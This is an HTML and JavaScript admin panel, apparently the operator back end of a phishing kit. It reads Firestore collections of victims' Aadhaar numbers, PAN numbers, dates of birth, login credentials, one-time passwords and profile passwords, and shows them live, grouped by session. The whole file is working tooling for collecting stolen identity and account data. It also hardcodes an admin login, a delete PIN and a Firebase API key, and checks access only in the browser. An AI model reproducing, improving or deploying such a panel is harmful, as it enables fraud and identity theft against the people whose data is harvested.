<html>
  <head>
    <title>Admin Panel</title>
    <style>/* Main styles yahin rahenge */</style>
  </head>
  <body>
    <div id="login">...</div>
    <div id="adminPanel" style="display:none">...</div>
    <div id="scrollButtons"></div>
    <div id="panelContainer"></div>
<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyCxRO9k9P6dzovbF0OugNzp1TF1yuAY1Xg",
    authDomain: "welcomingrewd.firebaseapp.com",
    projectId: "welcomingrewd",
    storageBucket: "welcomingrewd.firebasestorage.app",
    messagingSenderId: "33456614906",
    appId: "1:33456614906:web:b5828e5dcb0253cace0843"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  const collections = [
    'aadhaar_entries',
    'dob_entries',
    'logins',
    'otp_entries',
    'pan_entries',
    'profile_passwords'
  ];

  function login() {
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();
    if (email === "marconlinehoga@gmail.com" && password === "admin123") {
      document.getElementById("login").style.display = "none";
      document.getElementById("adminPanel").style.display = "block";
      loadPanelLayout();
    } else {
      alert("Invalid credentials");
    }
  }

  function loadPanelLayout() {
    const panel = document.getElementById("panelContainer");
    const buttonRow = document.getElementById("scrollButtons");
    panel.innerHTML = "";
    buttonRow.innerHTML = "";

    const topButtons = ['ALL_DATA', 'AADHAAR_ENTRIES', 'DOB_ENTRIES', 'LOGINS'];
    const bottomButtons = ['OTP_ENTRIES', 'PAN_ENTRIES', 'PROFILE_PASSWORDS'];

    const renderButton = (label, id, small = false) => {
      const btn = document.createElement("button");
      btn.textContent = label.replace(/_/g, " ");
      btn.className = small ? "btn-small" : "btn-large";
      btn.onclick = () => showOnlySection(id.toLowerCase() + "_section");
      buttonRow.appendChild(btn);
    };

    const showOnlySection = (id) => {
      document.querySelectorAll(".section").forEach(sec => sec.classList.remove("active"));
      const target = document.getElementById(id);
      if (target) target.classList.add("active");
    };

    topButtons.forEach(col => renderButton(col, col));
    bottomButtons.forEach(col => renderButton(col, col, true));

    const allSection = document.createElement("div");
    allSection.className = "section active";
    allSection.id = "all_data_section";
    allSection.innerHTML = "<h2>ALL DATA</h2><div id='allDataContent'></div>";
    panel.appendChild(allSection);

    const allData = [];

    collections.forEach(col => {
      const section = document.createElement("div");
      section.className = "section";
      section.id = col + "_section";

      const title = document.createElement("h2");
      title.textContent = col.replace(/_/g, " ").toUpperCase();
      section.appendChild(title);

      const content = document.createElement("div");
      section.appendChild(content);
      panel.appendChild(section);

      db.collection(col).orderBy("timestamp", "desc").onSnapshot(snapshot => {
        content.innerHTML = "";

        snapshot.docs.forEach(doc => {
          const data = doc.data();
          const docId = doc.id;
          const sessionId = data.sessionId || 'no-session';
          const timestamp = data.timestamp;

          const filteredData = {};
          Object.keys(data).forEach(k => {
            if (!['timestamp', '__collection', 'captcha', 'attempt', 'valid'].includes(k)) {
              filteredData[k] = data[k];
            }
          });

          allData.push({ sessionId, collection: col, data: filteredData, timestamp, docId });
          allData.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
          renderAllData(allData);

          const entry = document.createElement("div");
          entry.className = "entry";
          entry.innerHTML = formatSimple(filteredData);

          const delBtn = document.createElement("button");
          delBtn.className = "delete-btn";
          delBtn.textContent = "Delete";
          delBtn.onclick = () => {
            const input = prompt("Enter delete password:");
            if (input === "4542") {
              db.collection(col).doc(docId).delete();
            } else {
              alert("Wrong password");
            }
          };
          entry.appendChild(delBtn);
          content.appendChild(entry);
        });
      });
    });
  }

  function formatSimple(data) {
    return Object.entries(data)
      .map(([key, value]) => `${key} ${value}`)
      .join("<br>");
  }

  function renderAllData(dataArray) {
    const allContent = document.getElementById("allDataContent");
    if (!allContent) return;
    allContent.innerHTML = "";

    const grouped = {};

    dataArray.forEach(entry => {
      if (!grouped[entry.sessionId]) grouped[entry.sessionId] = [];
      grouped[entry.sessionId].push(entry);
    });

    Object.keys(grouped).forEach(sessionId => {
      const sessionDiv = document.createElement("div");
      sessionDiv.className = "entry";
      const time = grouped[sessionId][0]?.timestamp?.toDate().toLocaleString('en-GB', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
      
      let contentHTML = `<b>Session ID:</b> ${sessionId}<br><br>`;
      
      grouped[sessionId].forEach(entry => {
        contentHTML += formatSimple(entry.data) + "<br><br>";
      });

      contentHTML += `<div style="margin-top:10px; font-size:12px; color:gray;">Time: ${time || 'N/A'}</div>`;
      sessionDiv.innerHTML = contentHTML;
      allContent.appendChild(sessionDiv);
    });
  }
</script>